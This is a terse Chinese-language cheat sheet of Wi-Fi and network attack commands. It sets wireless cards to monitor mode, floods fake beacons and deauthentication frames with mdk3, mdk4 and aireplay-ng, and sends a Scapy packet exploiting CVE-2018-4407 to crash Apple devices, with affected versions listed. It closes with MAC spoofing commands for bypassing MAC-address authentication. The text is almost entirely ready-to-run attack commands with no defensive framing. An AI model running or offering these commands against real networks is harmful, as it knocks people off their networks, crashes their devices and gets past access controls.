  #### Beacon flood
	需切换网卡为监听模式
	>airmon-ng start wlan1
	创建大量虚假热点Mdk3 mon0 b
	>mdk3 wlan1mon b -f /root/wifi.txt -a -s 1500
  #### Deauth flood
	针对AP
	>airmon-ng start wlan1
	>aireplay-ng –deauth 10 –a AP's mac address mon0
	针对AP内设备
	>airmon-ng start wlan1       将网卡置为监听模式
	>airodump-ng wlan1mon –bssid 目标ap的ssid
	>aireplay-ng -0 0 -a ap的ssid -c AP的ssid wlan0mon 开始攻击
  #### Mdk3 destruction
	针对范围内
	>mdk3 wlan1mon d
	针对AP
	>airodump-ng wlan1mon
	>mdk3 wlan1mon a -a APmac 发起攻击
	黑名单
	>mdk3 wlan1mon d –c 信道 –b /blacklist.txt.
	>mdk3 wlan1mon  b -n test -w -g -c 1 -s 200
  #### WiFi芯片esp8266
  #### Mdk4
	>mdk4 wlan0mon d
  #### CVE-2018-4407
	Scapy
	send(IP(dst="192.168.1.132",options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
	Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）
	Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）
	Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）
	Apple OS X El Capitan及更早版本：所有设备
  #### 绕过mac地址认证
  ##### Ifconfig
	>ifconfig wlan1 down
	>ifconfig wlan1 hw ether xx:xx:xx:xx:xx:xx
	>ifconfig wlan1 up
  ##### Macchanger
	>macchanger –m xx:xx:xx:xx:xx:xx wlan1
	>macchanger –r wlan1